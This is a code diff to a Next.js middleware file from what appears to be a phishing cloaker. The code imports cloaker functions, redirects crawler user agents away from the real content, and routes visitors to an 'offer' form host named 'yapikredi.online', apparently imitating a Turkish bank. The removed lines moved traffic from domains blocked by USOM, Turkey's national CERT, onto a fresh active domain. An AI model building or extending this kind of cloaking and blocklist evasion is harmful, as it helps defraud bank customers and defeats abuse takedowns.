@@ -9,13 +9,7 @@ import {
   whiteRedirectTarget,
 } from "@/lib/cloaker";
 import {
-  getCachedActiveHostname,
-  getCachedBlockedHostnames,
-} from "@/lib/domains/active-cache";
-import {
-  buildActiveAdUrl,
   buildOfferHostUrl,
-  getActiveAdHost,
   getDefaultOfferHost,
   hasAdClickInUrl,
   isAdPoolHost,
@@ -103,36 +97,9 @@ export async function middleware(request: NextRequest) {
   const normalizedHost = normalizeHostname(host);
   const formHost = getDefaultOfferHost();
 
-  if (normalizedHost) {
-    const [activeAd, blocked] = await Promise.all([
-      getCachedActiveHostname(),
-      getCachedBlockedHostnames(),
-    ]);
-
-    // USOM: engelli domain → tek aktif reklam domainine
-    if (
-      activeAd &&
-      blocked.includes(normalizedHost) &&
-      normalizedHost !== activeAd &&
-      isAdPoolHost(normalizedHost)
-    ) {
-      const url = request.nextUrl.clone();
-      url.hostname = activeAd;
-      url.protocol = "https:";
-      return NextResponse.redirect(url, 302);
-    }
-
-    // Yedek reklam domaini — trafik harcamasın, aktif reklam domainine yönlendir
-    if (
-      isAdPoolHost(normalizedHost) &&
-      normalizedHost !== formHost
-    ) {
-      const active = activeAd ?? (await getActiveAdHost());
-      if (active && normalizedHost !== active) {
-        return NextResponse.redirect(await buildActiveAdUrl(request), 302);
-      }
-    }
-  }
+  // Reklam domainleri birbirine yönlendirilmez.
+  // Her entry domain kendi hostunda cloaker'dan geçer; offer kararı çıkarsa
+  // sadece form/offer hostuna (örn. yapikredi.online) yönlenir.
 
   if (CRAWLER_UA.test(ua)) {
     return NextResponse.redirect(
